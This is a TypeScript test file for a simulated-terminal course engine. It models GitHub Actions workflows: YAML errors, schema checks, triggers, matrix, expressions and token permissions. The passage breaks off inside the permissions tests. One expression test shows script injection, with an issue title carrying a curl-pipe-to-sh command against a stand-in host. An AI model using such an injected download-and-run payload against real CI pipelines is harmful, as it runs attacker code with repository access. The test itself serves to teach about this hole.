import { describe, expect, it } from 'vitest';
import { createHash } from 'node:crypto';
import { type FsState } from '@/lib/terminal/fs';
import { FORGE_PROFILE, WORKFLOWS_PROFILE, run } from '@/lib/terminal/shell';
import { GH_SUPPORTED } from '@/lib/terminal/gh';
import { parseYaml, YamlError } from '@/lib/terminal/yaml';
import { checkTerminalExercise, machineProblems, machineState, profileOf, replay, terminalContentProblems, variantMachine, type TerminalCheck, type TerminalMachine } from '@/lib/terminal/lesson';
import { parseWorkflow, workflowMessage, type Workflow } from '@/lib/terminal/workflow';
import { expandMatrix } from '@/lib/terminal/workflow-job';
import { filterMatches } from '@/lib/terminal/workflow-filter';
import { changedPaths, dispatchInputs, nextScheduled, pullChangedPaths, triggers } from '@/lib/terminal/workflow-match';
import { effectivePermissions, grantedScopes, permissionLines } from '@/lib/terminal/workflow-perms';
import { evaluate, parseExpr } from '@/lib/terminal/expr';
import { evalIf, interpolate, templateValue } from '@/lib/terminal/expr-template';
import { hashFiles } from '@/lib/terminal/expr-fn';
import { BROKEN_YML, brokenExercise, CI_YML, ID, leastExercise, SHOP, TOOLS, triggerExercise, workflowContent, workflowLab } from './support/workflow-fixture';

/*
 * Engine stage E27 (docs/curriculum/CICD0_E27_WORKFLOWS.md): the workflows profile — GitHub Actions workflow files as a
 * pure model (no job runs; E28 runs them): the YAML subset with columns and structured errors (Compose's texts unchanged),
 * the workflow schema and GitHub's validation texts, filter patterns, triggers, expressions and their functions, the
 * GITHUB_TOKEN's effective permissions, gh workflow list and view, the check workflow and the lesson data. Below the
 * profile everything behaves as in E26.
 */
function session(from: FsState | TerminalMachine, profile = WORKFLOWS_PROFILE, ...commands: string[]) {
  let state = 'files' in from ? machineState(from) : from;
  const log: { out: string[]; err: string[]; status?: number }[] = [];
  for (const cmd of commands) {
    const r = run(state, cmd, profile);
    state = r.state;
    log.push({ out: r.lines.filter(l => l.kind === 'out').map(l => l.text), err: r.lines.filter(l => l.kind === 'err').map(l => l.text), status: r.state.status });
  }
  return { state, log, last: log.at(-1)! };
}
const lab = (...commands: string[]) => session(workflowLab, WORKFLOWS_PROFILE, ...commands);
const P = '.github/workflows/ci.yml';
const parse = (text: string) => parseWorkflow(P, text);
const ok = (text: string): Workflow => { const p = parse(text); if (!p.ok) throw new Error(workflowMessage(p, P)); return p.workflow; };
const message = (text: string) => workflowMessage(parse(text), P);
/** A minimal valid workflow around a job body (indented four spaces). */
const job = (...lines: string[]) => ['on: push', 'jobs:', '  build:', '    runs-on: ubuntu-24.04', ...lines].join('\n');
const STEPS = ['    steps:', '      - run: echo hi'];

describe('the workflows profile', () => {
  it('is the forge profile with the workflows feature and no new commands', () => {
    expect(WORKFLOWS_PROFILE.commands).toEqual(FORGE_PROFILE.commands);
    expect(WORKFLOWS_PROFILE.features).toEqual([...FORGE_PROFILE.features!, 'workflows']);
    expect(profileOf(workflowLab)).toBe(WORKFLOWS_PROFILE);
    expect(machineProblems(workflowLab)).toEqual([]);
    expect(terminalContentProblems(workflowContent)).toEqual([]);
  });
  it('below it gh workflow is unsupported as in E26, and the data and checks need the profile', () => {
    const low = session({ ...workflowLab, profile: 'forge', forge: { login: 'mei-lin' } }, FORGE_PROFILE, 'cd shop', 'gh workflow list', 'gh');
    expect(low.log[1].err).toEqual([`gh workflow：模擬環境不支援這個指令（支援的指令：${GH_SUPPORTED}）`]);
    expect(low.log[2].out.at(-1)).toBe(`模擬環境支援的指令：${GH_SUPPORTED}`);
    expect(lab('gh').last.out.at(-1)).toBe(`模擬環境支援的指令：${GH_SUPPORTED}、workflow list|view`);
    expect(machineProblems({ ...workflowLab, profile: 'forge' })).toContain(`machine dev-04: forge repo ${TOOLS}: workflowPermissions needs the workflows profile (engine stage E27)`);
    const p = terminalContentProblems({ ...workflowContent, machines: [{ ...workflowLab, profile: 'forge', forge: { login: 'mei-lin' } }] });
    expect(p).toContain('exercise least: a workflow check needs a workflows machine (engine stage E27) and a repo (an absolute path or https://github.example/<owner>/<repo>.git)');
    expect(p).toContain('exercise trigger: a workflow check needs a workflows machine (engine stage E27) and a repo (an absolute path or https://github.example/<owner>/<repo>.git)');
    expect(machineState({ ...workflowLab, profile: 'forge', forge: { login: 'mei-lin' } }).git!.forge.every(f => f.site!.workflowPermissions === undefined)).toBe(true);
    expect(machineState(workflowLab).git!.forge.find(f => f.url === TOOLS)!.site!.workflowPermissions).toBe('write');
  });
});

describe('the YAML subset (E23) with columns and structured errors', () => {
  it('gives every node and key its line and column', () => {
    const y = parseYaml('a: 1\nb:\n  - x\n  - k: v\n    l: [p, "q"]\nc: {d: e}\n');
    expect(y).toMatchObject({ t: 'map', line: 1, col: 1, keys: [{ line: 1, col: 1 }, { line: 2, col: 1 }, { line: 6, col: 1 }] });
    const m = (y as Extract<typeof y, { t: 'map' }>).m;
    expect(m[0][1]).toMatchObject({ t: 'str', v: '1', line: 1, col: 4 });
    expect(m[1][1]).toMatchObject({ t: 'seq', line: 3, col: 3, a: [{ v: 'x', line: 3, col: 5 }, { t: 'map', col: 5, keys: [{ line: 4, col: 5 }, { line: 5, col: 5 }] }] });
    const inner = ((m[1][1] as Extract<typeof y, { t: 'seq' }>).a[1] as Extract<typeof y, { t: 'map' }>).m[1][1];
    expect(inner).toMatchObject({ t: 'seq', line: 5, col: 8, a: [{ v: 'p', col: 9 }, { v: 'q', col: 12 }] });
    expect(m[2][1]).toMatchObject({ t: 'map', col: 4, keys: [{ line: 6, col: 5 }], m: [['d', { v: 'e', col: 8 }]] });
  });
  it('keeps yaml.v3’s messages and adds the code, line and column', () => {
    const err = (t: string) => { try { parseYaml(t); return undefined; } catch (e) { return e as YamlError; } };
    expect(err('a:\n  b: 1\n c: 2\n')).toMatchObject({ message: 'yaml: line 3: did not find expected key', code: 'syntax', line: 3, column: 2, detail: 'did not find expected key' });
    expect(err('a: 1\na: 2\n')).toMatchObject({ message: 'yaml: line 2: mapping key "a" already defined at line 1', code: 'duplicate-key', line: 2, column: 1, detail: 'a' });
    expect(err('x:\n  y: &a 1\n')).toMatchObject({ code: 'unsupported', line: 2, column: 6, detail: '模擬環境的 YAML 子集不支援錨點與別名（&、*）' });
    expect(err('a: [1, 2\n')).toMatchObject({ message: "yaml: line 1: did not find expected ',' or ']'", line: 1 });
  });
  it('leaves Compose’s behaviour alone (the E23 tests and every published lesson replay unchanged)', () => {
    expect(() => parseYaml('services:\n  app:\n    image: nginx\n    image: x\n')).toThrow('yaml: line 4: mapping key "image" already defined at line 3');
  });
});

describe('workflow files: the schema and GitHub’s validation texts', () => {
  it('reads a valid workflow', () => {
    const w = ok(CI_YML);
    expect(w).toMatchObject({ name: 'CI', permissions: { contents: 'read' }, on: { events: ['push', 'pull_request'], push: { branches: ['main'], pathsIgnore: ['docs/**'] }, pullRequest: { branches: ['main'], types: ['opened', 'synchronize', 'reopened'] } } });
    expect(w.jobs).toMatchObject([{ id: 'test', runsOn: ['ubuntu-24.04'], timeoutMinutes: '360', continueOnError: 'false', steps: [{ uses: 'actions/checkout@v4' }, { run: 'python3 -m unittest' }] }]);
    expect(ok('on: [push, workflow_dispatch]\nrun-name: Deploy by ${{ github.actor }}\nenv:\n  A: x\ndefaults:\n  run:\n    shell: bash\nconcurrency: ci-${{ github.ref }}\njobs:\n  a:\n    runs-on: [self-hosted, linux]\n    steps:\n      - run: x\n'))
      .toMatchObject({ runName: 'Deploy by ${{ github.actor }}', env: [['A', 'x']], defaults: { shell: 'bash' }, concurrency: { group: 'ci-${{ github.ref }}', cancelInProgress: 'false' }, jobs: [{ runsOn: ['self-hosted', 'linux'] }] });
    const full = ok(job('    needs: []', '    if: github.event_name == \'push\'', '    env: { NODE: "20" }', '    outputs:', '      v: ${{ steps.s.outputs.v }}', '    timeout-minutes: 10',
      '    continue-on-error: ${{ matrix.experimental }}', '    environment:', '      name: prod', '      url: ${{ steps.s.outputs.url }}', '    strategy:', '      fail-fast: false', '      max-parallel: 2',
      '      matrix:', '        node: [18, 20]', '        experimental: [false]', '    steps:', '      - id: s', '        name: Build ${{ matrix.node }}', '        run: make', '        shell: bash', '        working-directory: app',
      '        env: { X: "1" }', '        if: ${{ success() && hashFiles(\'**/*.lock\') != \'\' }}', '        continue-on-error: true', '        timeout-minutes: 5', '      - uses: ./local-action', '        with: { a: b }'));
    expect(full.jobs[0]).toMatchObject({ if: "github.event_name == 'push'", env: [['NODE', '20']], timeoutMinutes: '10', environment: { name: 'prod', url: '${{ steps.s.outputs.url }}' },
      strategy: { failFast: 'false', maxParallel: '2', matrix: { vectors: [['node', [18, 20]], ['experimental', [false]]] } }, steps: [{ id: 's', shell: 'bash', workingDirectory: 'app', continueOnError: 'true', timeoutMinutes: '5' }, { uses: './local-action', with: [['a', 'b']] }] });
  });
  it('reports unknown keys and bad values at their line and column', () => {
    expect(message(BROKEN_YML)).toBe(['Invalid workflow file: .github/workflows/ci.yml#L13', "The workflow is not valid. .github/workflows/ci.yml (Line: 13, Col: 5): Unexpected value 'stepz'"].join('\n'));
    expect(message('name: x\non: pushh\nfoo: 1\njobs:\n  a:\n    steps:\n      - uses: actions/checkout\n      - name: nothing\n      - run: a\n        uses: b/c@v1\n')).toBe([
      'Invalid workflow file: .github/workflows/ci.yml#L2',
      "The workflow is not valid. .github/workflows/ci.yml (Line: 2, Col: 5): Unexpected value 'pushh'",
      ".github/workflows/ci.yml (Line: 3, Col: 1): Unexpected value 'foo'",
      '.github/workflows/ci.yml (Line: 6, Col: 5): Required property is missing: runs-on',
      ".github/workflows/ci.yml (Line: 7, Col: 15): Expected format {org}/{repo}[/path]@ref. Actual 'actions/checkout'",
      '.github/workflows/ci.yml (Line: 8, Col: 9): Every step must define a `uses` or `run` key',
      '.github/workflows/ci.yml (Line: 9, Col: 9): A step cannot have both the `uses` and `run` keys',
    ].join('\n'));
    const first = (text: string) => { const p = parse(text); return p.ok ? '' : `${p.errors[0].line}:${p.errors[0].col} ${p.errors[0].message}`; };
    expect(first('jobs:\n  a:\n    runs-on: x\n    steps: [{run: x}]\n')).toBe('1:1 Required property is missing: on');
    expect(first('on: push\n')).toBe('1:1 Required property is missing: jobs');
    expect(first('on:\njobs:\n  a:\n    runs-on: x\n    steps: [{run: x}]\n')).toBe('1:4 No event triggers defined in `on`');
    expect(first(job('    timeout-minutes: soon', ...STEPS))).toBe("5:22 Unexpected value 'soon'");
    expect(first(job('    continue-on-error: maybe', ...STEPS))).toBe("5:24 Unexpected value 'maybe'");
    expect(first(job('    env: [A]', ...STEPS))).toBe('5:10 A sequence was not expected');
    expect(first(job('    steps:', '      - run: {a: b}'))).toBe('6:14 A mapping was not expected');
    expect(first(job('    permissions:', '      content: read', ...STEPS))).toBe("6:7 Unexpected value 'content'");
    expect(first(job('    permissions:', '      contents: writ', ...STEPS))).toBe("6:17 Unexpected value 'writ'");
    expect(first(job('    permissions: all', ...STEPS))).toBe("5:18 Unexpected value 'all'");
    expect(first(['on: push', 'jobs:', '  my job:', '    runs-on: x', ...STEPS].join('\n'))).toBe("3:3 The identifier 'my job' is invalid. IDs may only contain alphanumeric characters, '_', and '-'. IDs must start with a letter or '_' and must be less than 100 characters.");
    expect(first(job('    steps:', '      - id: a', '        run: x', '      - id: a', '        run: y'))).toBe("8:9 The identifier 'a' may not be used more than once within the same scope.");
    expect(first(job('    strategy:', '      matrix:', '        node: []', ...STEPS))).toBe("7:15 Matrix vector 'node' does not contain any values");
    expect(first(job('    strategy:', '      matrix:', '        node: [1]', '        exclude:', '          - os: x', ...STEPS))).toBe("7:9 Matrix exclude key 'os' does not match any key within the matrix");
  });
  it('reports YAML errors as GitHub does', () => {
    expect(message('on: push\njobs:\n  a:\n    runs-on: x\n   steps: 1\n')).toBe('Invalid workflow file: .github/workflows/ci.yml#L5\nYou have an error in your yaml syntax on line 5');
    expect(message(job('    runs-on: y', ...STEPS))).toBe("Invalid workflow file: .github/workflows/ci.yml#L5\nThe workflow is not valid. .github/workflows/ci.yml (Line: 5, Col: 5): 'runs-on' is already defined");
    expect(message('on: &p push\njobs: {}\n')).toBe('Invalid workflow file: .github/workflows/ci.yml#L1\nThe workflow is not valid. .github/workflows/ci.yml (Line: 1, Col: 5): 模擬環境的 YAML 子集不支援錨點與別名（&、*）');
  });
  it('checks needs and steps after the file itself is valid', () => {
    expect(message('on: push\njobs:\n  a:\n    runs-on: x\n    needs: [b, c]\n    steps: [{run: x}]\n  b:\n    runs-on: x\n    needs: a\n    steps: [{run: x}]\n')).toBe([
      'Invalid workflow file: .github/workflows/ci.yml',
      "The workflow is not valid. .github/workflows/ci.yml: Job 'a' depends on unknown job 'c'.",
      ".github/workflows/ci.yml: Job 'b' depends on job 'a' which creates a cycle in the dependency graph.",
    ].join('\n'));
    expect(message(job('    steps: []'))).toBe('Invalid workflow file: .github/workflows/ci.yml\nThe workflow is not valid. .github/workflows/ci.yml: No steps defined in `steps` and no workflow called in `uses` for the following jobs: build');
    expect(parse(['on: push', 'jobs:', '  call:', '    uses: island/tools/.github/workflows/build.yml@main'].join('\n')).ok).toBe(true);
  });
  it('checks each expression against the contexts its place allows', () => {
    const first = (text: string) => { const p = parse(text); return p.ok ? '' : `${p.errors[0].line}:${p.errors[0].col} ${p.errors[0].message}`; };
    expect(first(job('    steps:', '      - run: echo ${{ secret.TOKEN }}'))).toBe("6:14 Unrecognized named-value: 'secret'. Located at position 1 within expression: secret.TOKEN");
    expect(first(job("    if: matrix.os == 'linux'", ...STEPS))).toBe("5:9 Unrecognized named-value: 'matrix'. Located at position 1 within expression: matrix.os == 'linux'");
    expect(first(job('    steps:', "      - if: secrets.TOKEN != ''", '        run: x'))).toBe("6:13 Unrecognized named-value: 'secrets'. Located at position 1 within expression: secrets.TOKEN != ''");
    expect(first(job("    env: { K: \"${{ hashFiles('a') }}\" }", ...STEPS))).toBe("5:10 Unrecognized function: 'hashFiles'. Located at position 1 within expression: hashFiles('a')");
    expect(first(job("    runs-on: ${{ steps.a.outputs.os }}", ...STEPS).replace('    runs-on: ubuntu-24.04\n', ''))).toBe("4:14 Unrecognized named-value: 'steps'. Located at position 1 within expression: steps.a.outputs.os");
    expect(first(job('    steps:', '      - run: echo ${{ github.sha'))).toBe('6:14 The expression is not closed. An unescaped ${{ sequence was found, but the closing }} sequence was not found.');
    expect(first(job('    steps:', '      - run: echo ${{ contains(github.ref) }}'))).toBe("6:14 Too few parameters supplied: 'contains'. Located at position 1 within expression: contains(github.ref)");
    expect(first('run-name: ${{ env.X }}\n' + job(...STEPS))).toBe("1:11 Unrecognized named-value: 'env'. Located at position 1 within expression: env.X");
    expect(first(job('    steps:', '      - if: always() && steps.a.outcome == \'failure\'', '        run: x'))).toBe('');
  });
});

describe('filter patterns (not shell globs)', () => {
  it('follows GitHub’s cheat sheet', () => {
    const m = (p: string | string[], v: string) => filterMatches(Array.isArray(p) ? p : [p], v);
    expect([m('feature/*', 'feature/a'), m('feature/*', 'feature/a/b'), m('feature/**', 'feature/a/b'), m('v2*', 'v2'), m('v2*', 'v20')]).toEqual([true, false, true, true, true]);
    expect([m('v[12].[0-9]+.[0-9]+', 'v1.10.1'), m('v[12].[0-9]+.[0-9]+', 'v2.0.0'), m('v[12].[0-9]+.[0-9]+', 'v3.0.0'), m('v[12].[0-9]+.[0-9]+', 'v1..1')]).toEqual([true, true, false, false]);
    expect([m('*.jsx?', 'page.js'), m('*.jsx?', 'page.jsx'), m('*.jsx?', 'page.jsxx'), m('*.jsx?', 'deep/page.js'), m('**.js', 'js/index.js')]).toEqual([true, true, false, false, true]);
    expect([m('docs/*', 'docs/file.txt'), m('docs/*', 'docs/a/b.md'), m('**/README.md', 'README.md'), m('**/README.md', 'server/README.md'), m('**/*src/**', 'my-src/code/app.js')]).toEqual([true, false, true, true, true]);
    expect([m('colou?r', 'color'), m('colou?r', 'colour'), m('ab+c', 'abbc'), m('ab+c', 'ac'), m('a\\*', 'a*'), m('a\\*', 'ab'), m('a?', 'a?')]).toEqual([true, true, true, false, true, false, false]);
  });
  it('applies patterns in order: a later ! excludes, a later pattern includes again', () => {
    expect([filterMatches(['releases/**', '!releases/**-alpha'], 'releases/10'), filterMatches(['releases/**', '!releases/**-alpha'], 'releases/10-alpha')]).toEqual([true, false]);
    expect(filterMatches(['!releases/**-alpha', 'releases/**'], 'releases/10-alpha')).toBe(true);
    expect(filterMatches(['*.md', '!README*', 'README.md'], 'README.md')).toBe(true);
    expect(filterMatches(['!main'], 'dev')).toBe(false);
  });
});

describe('triggers', () => {
  const ci = ok(CI_YML).on;
  it('push: branch filters, path filters, and tags only when the workflow names tags', () => {
    expect(triggers(ci, { name: 'push', ref: 'refs/heads/main', changed: ['app.py'] })).toBe(true);
    expect(triggers(ci, { name: 'push', ref: 'refs/heads/main', changed: ['docs/guide.md'] })).toBe(false);
    expect(triggers(ci, { name: 'push', ref: 'refs/heads/main', changed: ['docs/guide.md', 'app.py'] })).toBe(true);
    expect(triggers(ci, { name: 'push', ref: 'refs/heads/main', changed: [] })).toBe(false);
    expect(triggers(ci, { name: 'push', ref: 'refs/heads/dev', changed: ['app.py'] })).toBe(false);
    expect(triggers(ci, { name: 'push', ref: 'refs/tags/v1' })).toBe(false);
    const release = ok(['on:', '  push:', '    tags: ["v*", "!v*-rc*"]', ...job(...STEPS).split('\n').slice(1)].join('\n')).on;
    expect([triggers(release, { name: 'push', ref: 'refs/tags/v1.0' }), triggers(release, { name: 'push', ref: 'refs/tags/v1.0-rc1' }), triggers(release, { name: 'push', ref: 'refs/heads/main' })]).toEqual([true, false, false]);
    const paths = ok(['on:', '  push:', '    paths: ["src/**", "!src/**/*.md"]', ...job(...STEPS).split('\n').slice(1)].join('\n')).on;
    expect([triggers(paths, { name: 'push', ref: 'refs/heads/x', changed: ['src/a.ts'] }), triggers(paths, { name: 'push', ref: 'refs/heads/x', changed: ['src/a/README.md'] }), triggers(paths, { name: 'push', ref: 'refs/tags/v1', changed: [] })]).toEqual([true, false, true]);
    const any = ok(job(...STEPS)).on;
    expect([triggers(any, { name: 'push', ref: 'refs/tags/v1' }), triggers(any, { name: 'push', ref: 'refs/heads/x' }), triggers(any, { name: 'workflow_dispatch', ref: 'refs/heads/x' })]).toEqual([true, true, false]);
  });
  it('pull_request: activity types, branch filters on the base, the three-dot diff, none while it conflicts', () => {
    expect(triggers(ci, { name: 'pull_request', base: 'main', changed: ['app.py'] })).toBe(true);
    expect(triggers(ci, { name: 'pull_request', base: 'main', action: 'synchronize', changed: ['app.py'] })).toBe(true);
    expect(triggers(ci, { name: 'pull_request', base: 'main', action: 'closed' })).toBe(false);
    expect(triggers(ci, { name: 'pull_request', base: 'dev' })).toBe(false);
    expect(triggers(ci, { name: 'pull_request', base: 'main', conflict: true })).toBe(false);
    const closed = ok(['on:', '  pull_request:', '    types: [closed]', '    paths-ignore: ["docs/**"]', ...job(...STEPS).split('\n').slice(1)].join('\n')).on;
    expect([triggers(closed, { name: 'pull_request', base: 'x', action: 'closed', changed: ['a'] }), triggers(closed, { name: 'pull_request', base: 'x', action: 'opened', changed: ['a'] }), triggers(closed, { name: 'pull_request', base: 'x', action: 'closed', changed: ['docs/a'] })]).toEqual([true, false, false]);
    expect(message(['on:', '  pull_request:', '    types: [open]', ...job(...STEPS).split('\n').slice(1)].join('\n'))).toContain("(Line: 3, Col: 13): Unexpected value 'open'");
    expect(message(['on:', '  push:', '    branches: [a]', '    branches-ignore: [b]', ...job(...STEPS).split('\n').slice(1)].join('\n'))).toContain('(Line: 3, Col: 5): you may only define one of `branches` and `branches-ignore` for a single event');
    const s = machineState(workflowLab), objects = s.git!.objects, labels = s.git!.labels!;
    expect(changedPaths(objects, labels.get('c1'), labels.get('c2')!)).toEqual(['.github/workflows/release.yml', 'docs/guide.md']);
    expect(pullChangedPaths(objects, labels.get('c1')!, labels.get('b1')!)).toEqual(['.github/workflows/ci.yml', '.github/workflows/release.yml', 'docs/guide.md']);
    expect(pullChangedPaths(objects, labels.get('c2')!, labels.get('b1')!)).toEqual(['.github/workflows/ci.yml']);
  });
  it('workflow_dispatch with typed inputs, and schedule on the default branch in UTC', () => {
    const w = ok(['on:', '  workflow_dispatch:', '    inputs:', '      level: { type: choice, options: [patch, minor], default: patch }', '      dry: { type: boolean }', '      count: { type: number, required: true }',
      '      note: { description: Why }', '  schedule:', '    - cron: "30 2 * * 1-5"', '    - cron: "0 0 1 * *"', ...job(...STEPS).split('\n').slice(1)].join('\n')).on;
    expect(w.dispatch!.inputs.map(i => [i.name, i.type, i.required])).toEqual([['level', 'choice', false], ['dry', 'boolean', false], ['count', 'number', true], ['note', 'string', false]]);
    expect(dispatchInputs(w.dispatch!.inputs, { count: '3' })).toEqual({ values: { level: 'patch', dry: false, count: 3, note: '' } });
    expect(dispatchInputs(w.dispatch!.inputs, { count: '3', dry: 'true', level: 'minor' })).toEqual({ values: { level: 'minor', dry: true, count: 3, note: '' } });
    expect(dispatchInputs(w.dispatch!.inputs, {})).toEqual({ error: "Required input 'count' not provided" });
    expect(dispatchInputs(w.dispatch!.inputs, { count: '1', level: 'major' })).toEqual({ error: "Provided value 'major' for input 'level' not in the list of allowed values" });
    expect(dispatchInputs(w.dispatch!.inputs, { count: '1', extra: 'x' })).toEqual({ error: 'Unexpected inputs provided: ["extra"]' });
    expect(triggers(w, { name: 'workflow_dispatch', ref: 'refs/heads/feature' })).toBe(true);
    expect(triggers(w, { name: 'schedule', ref: 'refs/heads/main', defaultBranch: 'main' })).toBe(true);
    expect(triggers(w, { name: 'schedule', ref: 'refs/heads/dev', defaultBranch: 'main' })).toBe(false);
    const after = Date.UTC(2026, 10, 23, 0, 0, 0) / 1000;
    expect(nextScheduled(w, after, 3).map(x => [new Date(x.at * 1000).toISOString(), x.cron])).toEqual([
      ['2026-11-23T02:30:00.000Z', '30 2 * * 1-5'], ['2026-11-24T02:30:00.000Z', '30 2 * * 1-5'], ['2026-11-25T02:30:00.000Z', '30 2 * * 1-5']]);
    expect(message(['on:', '  schedule:', '    - cron: "@daily"', ...job(...STEPS).split('\n').slice(1)].join('\n'))).toContain("(Line: 3, Col: 13): Invalid cron expression '@daily'");
    expect(message(['on:', '  workflow_dispatch:', '    inputs:', '      x: { type: choice }', ...job(...STEPS).split('\n').slice(1)].join('\n'))).toContain('Required property is missing: options');
  });
});

describe('matrix', () => {
  it('expands vectors, then exclude, then include as GitHub documents', () => {
    const w = ok(job('    strategy:', '      matrix:', '        fruit: [apple, pear]', '        animal: [cat, dog]', '        include:', '          - color: green', '          - color: pink', '            animal: cat',
      '          - fruit: apple', '            shape: circle', '          - fruit: banana', '          - fruit: banana', '            animal: cat', ...STEPS));
    expect(expandMatrix(w.jobs[0].strategy!.matrix!)).toEqual([
      { fruit: 'apple', animal: 'cat', color: 'pink', shape: 'circle' }, { fruit: 'apple', animal: 'dog', color: 'green', shape: 'circle' },
      { fruit: 'pear', animal: 'cat', color: 'pink' }, { fruit: 'pear', animal: 'dog', color: 'green' }, { fruit: 'banana' }, { fruit: 'banana', animal: 'cat' }]);
    const x = ok(job('    strategy:', '      matrix:', '        os: [ubuntu, windows]', '        node: [18, 20]', '        exclude:', '          - os: windows', '            node: 18', ...STEPS));
    expect(expandMatrix(x.jobs[0].strategy!.matrix!)).toEqual([{ os: 'ubuntu', node: 18 }, { os: 'ubuntu', node: 20 }, { os: 'windows', node: 20 }]);
    expect(ok(job('    strategy:', '      matrix: ${{ fromJSON(needs.a.outputs.m) }}', ...STEPS)).jobs[0].strategy!.matrix).toMatchObject({ expression: '${{ fromJSON(needs.a.outputs.m) }}' });
  });
});

describe('expressions', () => {
  const ctx = {
    contexts: {
      github: { ref: 'refs/heads/main', event_name: 'push', event: { commits: [{ author: { name: 'Mei' } }, { author: { name: 'Hua' } }], issue: { title: 'Fix "x"', labels: [{ name: 'bug' }, { name: 'UI' }] } } },
      env: { NODE: '20' }, matrix: { node: 18, experimental: false }, steps: { build: { outputs: { version: '1.2.0' }, outcome: 'success' } },
    },
  };
  const ev = (e: string, c = ctx) => evaluate(parseExpr(e), c);
  it('has literals, operators with GitHub’s precedence and loose comparisons', () => {
    expect([ev("1 < 2 && 'a' < 'B'"), ev("'abc' == 'ABC'"), ev('0x10 == 16'), ev('null == 0'), ev("'' == false"), ev("'1.5' == 1.5"), ev("'x' == 0"), ev("'x' != 0")]).toEqual([true, true, true, true, true, true, false, true]);
    expect([ev('1 || 2'), ev('0 && 2'), ev("'' || 'default'"), ev('!0'), ev('1 < 2 == true'), ev("!(github.ref == 'x') && true")]).toEqual([1, 0, 'default', true, true, true]);
    expect([ev("fromJSON('{}') == fromJSON('{}')"), ev("'it''s'"), ev('-1.5e1'), ev('null')]).toEqual([false, "it's", -15, null]);
  });
  it('reads contexts without regard to case, with filters and indexes', () => {
    expect([ev('GITHUB.REF'), ev("github['event_name']"), ev('github.nothing.deeper'), ev('github.event.commits[1].author.name'), ev('github.event.commits[5]')]).toEqual(['refs/heads/main', 'push', null, 'Hua', null]);
    expect(ev('github.event.commits.*.author.name')).toEqual(['Mei', 'Hua']);
    expect(ev("contains(github.event.issue.labels.*.name, 'ui')")).toBe(true);
    expect(ev('steps.build.outputs.version')).toBe('1.2.0');
  });
  it('has the functions', () => {
    expect([ev("contains('Hello', 'ELL')"), ev("startsWith(github.ref, 'refs/heads/')"), ev("endsWith('a.TXT', '.txt')"), ev("contains(fromJSON('[1, 2]'), '2')")]).toEqual([true, true, true, true]);
    expect([ev("format('{0}-{{1}}-{1}', matrix.node, true)"), ev("join(github.event.commits.*.author.name)"), ev("join(github.event.commits.*.author.name, ' & ')"), ev("join('one')")]).toEqual(['18-{1}-true', 'Mei,Hua', 'Mei & Hua', 'one']);
    expect(ev('toJSON(matrix)')).toBe('{\n  "node": 18,\n  "experimental": false\n}');
    expect([ev('toJSON(null)'), ev("toJSON('a')"), ev("fromJSON('{\"a\": [true]}').a[0]"), ev("toJson(fromJSON('[]'))")]).toEqual(['null', '"a"', true, '[]']);
    expect(() => ev("format('{1}', 'a')")).toThrow('The following format string references more arguments than were supplied: {1}');
    expect(() => ev("format('{x}')")).toThrow('The following format string is invalid: {x}');
    expect(() => ev("fromJSON('nope')")).toThrow('Error parsing fromJson: nope');
  });
  it('gives the runner’s parse errors', () => {
    const err = (e: string) => { try { parseExpr(e); return ''; } catch (x) { return (x as Error).message; } };
    expect(err('github.')).toBe("Unexpected end of expression: '.'. Located at position 7 within expression: github.");
    expect(err('github.ref = 1')).toBe("Unexpected symbol: '='. Located at position 12 within expression: github.ref = 1");
    expect(err("foo('a')")).toBe("Unrecognized function: 'foo'. Located at position 1 within expression: foo('a')");
    expect(err("join('a', 'b', 'c')")).toBe("Too many parameters supplied: 'join'. Located at position 1 within expression: join('a', 'b', 'c')");
    expect(err("'open")).toBe("Unexpected symbol: ''open'. Located at position 1 within expression: 'open");
    expect(err('  ')).toBe('An expression was expected');
    expect(err('success()')).toBe("Unrecognized function: 'success'. Located at position 1 within expression: success()");
  });
  it('turns values into text in templates (script injection happens before Bash reads run:)', () => {
    expect(interpolate('node ${{ matrix.node }} ${{ matrix.experimental }} [${{ github.none }}] ${{ github.event }} ${{ github.event.commits }}', ctx)).toBe('node 18 false [] Object Array');
    expect(templateValue("${{ fromJSON('[1]') }}", ctx)).toEqual([1]);
    expect(templateValue('v${{ matrix.node }}', ctx)).toBe('v18');
    const evil = { contexts: { github: { event: { issue: { title: 'x"; curl -s http://evil.example | sh; echo "' } } } } };
    expect(interpolate('echo "${{ github.event.issue.title }}"', evil)).toBe('echo "x"; curl -s http://evil.example | sh; echo ""');
  });
  it('evaluates if: with the implicit success() and the status functions', () => {
    const failed = { ...ctx, status: { failure: true } }, cancelled = { ...ctx, status: { cancelled: true } };
    expect([evalIf("github.ref == 'refs/heads/main'", ctx), evalIf("${{ github.ref == 'refs/heads/main' }}", ctx), evalIf("github.ref == 'refs/heads/main'", failed)]).toEqual([true, true, false]);
    expect([evalIf('failure()', failed), evalIf('failure()', ctx), evalIf('always()', cancelled), evalIf('cancelled()', cancelled), evalIf('success()', cancelled)]).toEqual([true, false, true, true, false]);
    expect(evalIf("${{ github.ref }} == 'refs/heads/nope'", ctx)).toBe(true);
    expect(evalIf('false', ctx)).toBe(false);
  });
  it('hashFiles hashes each matching file, then the digests', () => {
    const files = new Map([['package-lock.json', 'a'], ['web/package-lock.json', 'b'], ['README.md', 'c']]);
    const sha = (b: Buffer | string) => createHash('sha256').update(b).digest();
    const want = createHash('sha256').update(Buffer.concat([sha('a'), sha('b')])).digest('hex');
    expect(hashFiles(['**/package-lock.json'], files)).toBe(want);
    expect(hashFiles(['**/package-lock.json', '!web/**'], files)).toBe(createHash('sha256').update(sha('a')).digest('hex'));
    expect(hashFiles(['*.lock'], files)).toBe('');
    expect(evaluate(parseExpr("hashFiles('**/package-lock.json')", { functions: ['hashFiles'] }), { contexts: {}, files })).toBe(want);
  });
});

describe('GITHUB_TOKEN permissions', () => {
  it('takes the job’s, else the workflow’s, else the repository default; naming a scope sets the others to none', () => {
    expect(grantedScopes(effectivePermissions(undefined, undefined, 'read'))).toEqual(['contents: read', 'packages: read']);
    expect(grantedScopes(effectivePermissions(undefined, undefined, 'write'))).toHaveLength(13);
    expect(grantedScopes(effectivePermissions(undefined, undefined, 'write'))).not.toContain('id-token: write');
    expect(grantedScopes(effectivePermissions({ contents: 'read' }, undefined, 'write'))).toEqual(['contents: read']);
    expect(grantedScopes(effectivePermissions('read-all', { issues: 'write', contents: 'none' }, 'write'))).toEqual(['issues: write']);
    expect(grantedScopes(effectivePermissions({}, undefined, 'write'))).toEqual([]);
    expect(grantedScopes(effectivePermissions('write-all', undefined, 'read'))).toContain('id-token: write');
    expect(effectivePermissions('read-all', undefined, 'read')).toMatchObject({ contents: 'read', 'id-token': 'none', metadata: 'read' });
